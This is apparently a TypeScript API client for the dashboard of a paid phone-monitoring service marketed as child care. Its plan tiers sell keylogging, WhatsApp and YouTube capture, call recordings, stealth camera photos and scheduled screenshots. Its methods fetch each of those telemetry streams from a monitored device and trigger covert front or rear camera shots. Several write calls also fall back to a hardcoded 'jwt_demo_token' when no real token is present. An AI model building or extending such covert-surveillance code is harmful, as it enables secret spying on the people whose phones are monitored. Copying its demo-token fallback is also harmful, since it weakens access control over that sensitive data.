// Relative API helper taking advantage of Vite server proxy (/api -> http://localhost:3000)
async function apiFetch<T>(endpoint: string, fallbackData: T, customHeaders: Record<string, string> = {}): Promise<T> {
  try {
    const cleanEndpoint = endpoint.startsWith('/') ? endpoint : `/${endpoint}`;
    // Ensures global prefix /api/v1/ is formatted correctly
    const path = cleanEndpoint.startsWith('/api/v1') 
      ? cleanEndpoint 
      : `/api/v1${cleanEndpoint.replace(/^\/api/, '')}`;

    const token = localStorage.getItem('childcare_auth_token');

    // If no token exists and endpoint is protected, trigger unauthorized redirect immediately
    const isPublicEndpoint = path.includes('/plans') || path.includes('/auth/') || path.includes('/payments/');
    if (!token && !isPublicEndpoint) {
      window.dispatchEvent(new CustomEvent('auth:unauthorized'));
      return fallbackData;
    }

    const response = await fetch(path, {
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        ...(token ? { 'Authorization': `Bearer ${token}` } : {}),
        ...customHeaders
      }
    });

    if (response.status === 401) {
      console.warn(`[Dashboard API] HTTP 401 Unauthorized for ${path}. Redirecting to login.`);
      localStorage.removeItem('childcare_auth_token');
      window.dispatchEvent(new CustomEvent('auth:unauthorized'));
      return fallbackData;
    }

    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }

    const data = await response.json();
    return data as T;
  } catch (error) {
    console.warn(`[Dashboard API] Failed to fetch ${endpoint}. Using fallback state.`, error);
    return fallbackData;
  }
}

export const apiService = {
  // 1. Devices List
  async getDevices(fallback: any[]) {
    return apiFetch<any[]>('/api/v1/devices', fallback);
  },

  // 2. Parent User licenses (Authenticated via Bearer Token Header)
  async getLicenses(fallback: any[]) {
    return apiFetch<any[]>('/api/v1/licenses/my-licenses', fallback);
  },

  // 3. Dynamic Plan Tiers & Feature Matrix
  async getPlans() {
    return apiFetch<any[]>('/api/v1/plans', [
      {
        code: 'basic',
        name: 'Basic Plan',
        badge: null,
        pricing: { 1: 1499, 3: 2999, 12: 5999 },
        features: ['calls', 'sms', 'contacts', 'location', 'apps', 'app_usage', 'calendar']
      },
      {
        code: 'premium',
        name: 'Premium Plan',
        badge: 'Most Popular',
        pricing: { 1: 1999, 3: 3999, 12: 7999 },
        features: ['calls', 'sms', 'contacts', 'location', 'apps', 'app_usage', 'calendar', 'web_history', 'web_filter', 'app_block', 'call_block', 'keylogger', 'whatsapp', 'youtube']
      },
      {
        code: 'vip',
        name: 'VIP Plan',
        badge: 'Best Value',
        pricing: { 1: 2999, 3: 5999, 12: 11999 },
        features: ['calls', 'sms', 'contacts', 'location', 'apps', 'app_usage', 'calendar', 'web_history', 'web_filter', 'app_block', 'call_block', 'keylogger', 'whatsapp', 'youtube', 'screenshots', 'stealth_photos', 'call_recordings', 'device_lock']
      }
    ]);
  },

  // 4. Create Real Cashfree PG Order
  async createPaymentOrder(payload: {
    planCode: string;
    durationMonths: number;
    quantity: number;
    customerName: string;
    customerEmail: string;
    customerPhone: string;
    customerAddress?: string;
    addAssistance?: boolean;
  }) {
    try {
      const response = await fetch('/api/v1/payments/create-order', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      return await response.json();
    } catch (err: any) {
      return { success: false, message: err?.message || 'Payment network error' };
    }
  },

  // 5. Verify & Complete Paid Order (Provisions Licenses in DB)
  async verifyPaymentOrder(orderId: string, referenceId?: string) {
    try {
      const response = await fetch(`/api/v1/payments/verify-order/${orderId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ referenceId }),
      });
      return await response.json();
    } catch (err: any) {
      return { success: false, message: err?.message || 'Order verification error' };
    }
  },

  // 6. Check Order Status
  async getOrderStatus(orderId: string) {
    try {
      const response = await fetch(`/api/v1/payments/order-status/${orderId}`);
      return await response.json();
    } catch (err: any) {
      return { success: false, message: err?.message || 'Status check error' };
    }
  },

  // 7. Unlink License from Device (Unlimited Device Change)
  async unlinkLicense(licenseKey: string) {
    try {
      const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';
      const response = await fetch('/api/v1/licenses/unlink', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({ licenseKey })
      });
      return await response.json();
    } catch (err: any) {
      return { success: false, message: err?.message || 'License unlink failed' };
    }
  },

  // 4. Calls Log
  async getCalls(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/calls/${deviceId}`, fallback);
  },

  // 5. SMS Log
  async getSms(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/sms/${deviceId}`, fallback);
  },

  // 6. Location History
  async getLocations(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/location/${deviceId}`, fallback);
  },

  // 7. Contacts Inventory
  async getContacts(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/contacts/${deviceId}`, fallback);
  },

  // 8. Keylogger Stream
  async getKeylogger(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/keylogger/${deviceId}`, fallback);
  },

  // 9. Installed Applications
  async getInstalledApps(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/installed-apps/${deviceId}`, fallback);
  },

  // 10. Internet History
  async getWebHistory(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/web-history/${deviceId}`, fallback);
  },

  // 11. Calendar Events
  async getCalendar(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/calendar/${deviceId}`, fallback);
  },

  // 12. Call Audio Recordings
  async getRecordings(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/recordings/${deviceId}`, fallback);
  },

  // 12.5 WhatsApp Telemetry Stream
  async getWhatsApp(deviceId: string, fallback: any[] = []) {
    return apiFetch<any[]>(`/api/v1/telemetry/whatsapp/${deviceId}`, fallback);
  },

  // 12.6 YouTube Telemetry Stream
  async getYouTube(deviceId: string, fallback: any[] = []) {
    return apiFetch<any[]>(`/api/v1/telemetry/youtube/${deviceId}`, fallback);
  },

  // 13. Policy: App Blocking
  async toggleAppBlock(payload: { deviceId: string; packageName: string; appName?: string; isBlocked: boolean }) {
    try {
      const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';
      const res = await fetch('/api/v1/policy/apps/block', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify(payload)
      });
      return await res.json();
    } catch (err) {
      return { success: false, message: 'App policy connection error' };
    }
  },

  async getAppRules(deviceId: string) {
    return apiFetch<any[]>(`/api/v1/policy/apps/${deviceId}`, []);
  },

  // 14. Policy: Call Blocking
  async toggleCallBlock(payload: { deviceId: string; phoneNumber: string; contactName?: string; isBlocked: boolean }) {
    try {
      const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';
      const res = await fetch('/api/v1/policy/calls/block', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify(payload)
      });
      return await res.json();
    } catch (err) {
      return { success: false, message: 'Call policy connection error' };
    }
  },

  async getCallRules(deviceId: string) {
    return apiFetch<any[]>(`/api/v1/policy/calls/${deviceId}`, []);
  },

  // 15. Policy: Web Domain Filtering
  async toggleWebBlock(payload: { deviceId: string; domain: string; isBlocked: boolean }) {
    try {
      const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';
      const res = await fetch('/api/v1/policy/web/block', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify(payload)
      });
      return await res.json();
    } catch (err) {
      return { success: false, message: 'Web policy connection error' };
    }
  },

  async getWebRules(deviceId: string) {
    return apiFetch<any[]>(`/api/v1/policy/web/${deviceId}`, []);
  },

  // 16. Stealth Photo Command Trigger
  async triggerStealthPhoto(payload: { deviceId: string; camera: 'FRONT' | 'REAR' | 'BOTH' }) {
    try {
      const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';
      const res = await fetch('/api/v1/commands/stealth-photo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify(payload)
      });
      return await res.json();
    } catch (err) {
      return { success: false, message: 'Stealth photo connection error' };
    }
  },

  // 17. Command Statuses
  async getCommandStatuses(deviceId: string) {
    return apiFetch<{ success: boolean; statuses: Record<string, { status: string; error?: string; timestamp: number; camera?: 'FRONT' | 'REAR'; action?: string }> }>(
      `/api/v1/commands/status/${deviceId}`,
      { success: false, statuses: {} }
    );
  },

  // 18. Instant Screenshot Trigger
  async triggerScreenshot(payload: { deviceId: string }) {
    try {
      const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';
      const res = await fetch('/api/v1/commands/screenshot', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify(payload)
      });
      return await res.json();
    } catch (err) {
      return { success: false, message: 'Screenshot connection error' };
    }
  },

  // 19. Schedule Screenshot Captures Trigger
  async setScreenshotSchedule(payload: { deviceId: string; active: boolean; durationMin?: number; intervalSec?: number; startDelayMin?: number; startTime?: number }) {
    try {
      const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';
      const res = await fetch('/api/v1/commands/screenshot/schedule', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify(payload)
      });
      return await res.json();
    } catch (err) {
      return { success: false, message: 'Schedule connection error' };
    }
  },

  async getScreenshotSchedule(deviceId: string) {
    return apiFetch<{ success: boolean; schedule: { active: boolean; durationMin: number; intervalSec: number; startTime: number; stopTime: number; startDelayMin?: number } }>(
      `/api/v1/commands/screenshot/schedule/${deviceId}`,
      { success: false, schedule: { active: false, durationMin: 15, intervalSec: 30, startTime: 0, stopTime: 0, startDelayMin: 0 } }
    );
  }
};

